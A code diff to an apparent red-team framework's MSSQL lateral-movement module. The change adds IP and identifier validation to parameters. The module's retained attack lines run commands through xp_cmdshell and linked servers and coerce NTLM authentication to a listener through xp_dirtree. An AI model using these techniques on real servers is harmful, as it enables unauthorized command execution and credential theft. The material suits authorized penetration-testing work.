@@ -17,6 +17,8 @@ OPSEC: MEDIUM - SQL queries appear legitimate in server logs.
 from __future__ import annotations
 
 import asyncio
+import ipaddress
+import re
 from typing import Any
 
 from ares.core.campaign import Finding, Severity
@@ -87,6 +89,19 @@ class MSSQLModule(BaseModule):
                 "Use 'sa' or a db_owner account for xp_cmdshell.",
                 module_id=self.MODULE_ID, field="username",
             )
+        technique = ctx.params.get("technique", "xp_cmdshell")
+        listener = ctx.params.get("listener") or ctx.params.get("listener_ip")
+        if technique == "unc_coerce" or listener:
+            if not listener:
+                raise ModuleValidationError(
+                    "lateral.mssql with unc_coerce requires 'listener' or 'listener_ip'.",
+                    module_id=self.MODULE_ID, field="listener_ip",
+                )
+            self._validate_listener_ip(listener)
+
+        linked = ctx.params.get("linked")
+        if technique == "linked" and linked:
+            self._validate_linked_server(linked)
 
     async def execute(self, ctx: "Any") -> "ModuleResult":
         """ExecutionContext-based entry point (v0.9.0+).
@@ -328,6 +343,7 @@ class MSSQLModule(BaseModule):
 
         # UNC path NTLM coercion via xp_dirtree
         elif technique == "unc_coerce" and listener:
+            listener = self._validate_listener_ip(listener)
             try:
                 await self.before_request(listener, "smb")
             except Exception as exc:
@@ -480,15 +496,60 @@ class MSSQLModule(BaseModule):
                 except Exception:
                     pass
 
+    def _validate_listener_ip(self, ip: str) -> str:
+        """
+        Validate listener_ip strictly as an IPv4 or IPv6 address literal.
+        Rejects hostnames and injection payloads to prevent DNS rebinding and SQL injection.
+        """
+        from ares.core.errors import ModuleValidationError
+        if not ip or not isinstance(ip, str):
+            raise ModuleValidationError(
+                f"listener_ip must be a valid IP address, got: {ip!r}",
+                module_id=self.MODULE_ID,
+                field="listener_ip",
+            )
+        try:
+            # Terima IPv4 dan IPv6, tolak hostname untuk mencegah
+            # injection via DNS rebinding
+            parsed = ipaddress.ip_address(ip.strip())
+            return str(parsed)
+        except ValueError:
+            raise ModuleValidationError(
+                f"listener_ip must be a valid IP address, got: {ip!r}",
+                module_id=self.MODULE_ID,
+                field="listener_ip",
+            )
+
+    def _validate_linked_server(self, name: str) -> str:
+        """
+        Validate linked server name identifier to prevent SQL injection in EXEC (...) AT [...].
+        Accepts valid alphanumeric identifier with underscore, dot, or dash.
+        """
+        from ares.core.errors import ModuleValidationError
+        if not name or not isinstance(name, str):
+            raise ModuleValidationError(
+                f"linked_server must be a non-empty string identifier, got: {name!r}",
+                module_id=self.MODULE_ID,
+                field="linked",
+            )
+        cleaned = name.strip()
+        if not re.match(r"^[a-zA-Z0-9_.\-]+$", cleaned):
+            raise ModuleValidationError(
+                f"linked_server identifier contains invalid characters: {name!r}",
+                module_id=self.MODULE_ID,
+                field="linked",
+            )
+        return cleaned
+
     def _linked_server_sync(self, target: str, username: str, password: str,
                              port: int, linked: str, command: str) -> str:
         """Execute command via linked server xp_cmdshell."""
+        safe_linked = self._validate_linked_server(linked)
         try:
             import pymssql  # type: ignore[import]
             conn = pymssql.connect(target, username, password, "master", port=port, timeout=15)
             cur  = conn.cursor()
-            safe_cmd    = command.replace("'", "''")   # SQL-escape
-            safe_linked = linked.replace("[", "").replace("]", "").replace(";", "")  # strip bracket injection
+            safe_cmd = command.replace("'", "''")   # SQL-escape
             q = (f"EXEC ('{safe_cmd}') AT [{safe_linked}]")
             cur.execute(q)
             rows = cur.fetchall()
@@ -501,14 +562,13 @@ class MSSQLModule(BaseModule):
     def _unc_coerce_sync(self, target: str, username: str, password: str,
                           port: int, listener_ip: str) -> bool:
         """Coerce NTLM auth from SQL server to listener via xp_dirtree."""
-        from ares.core.security import sanitize_hostname
-        listener_ip = sanitize_hostname(listener_ip)  # prevent injection into xp_dirtree UNC path
+        valid_ip = self._validate_listener_ip(listener_ip)
         try:
             import pymssql  # type: ignore[import]
             conn = pymssql.connect(target, username, password, "master", port=port, timeout=10)
             cur  = conn.cursor()
             try:
-                cur.execute(f"EXEC xp_dirtree '\\\\{listener_ip}\\share'")
+                cur.execute(f"EXEC xp_dirtree '\\\\{valid_ip}\\share'")
             except Exception:
                 pass   # expected - NTLM sent before this fails
             conn.close()
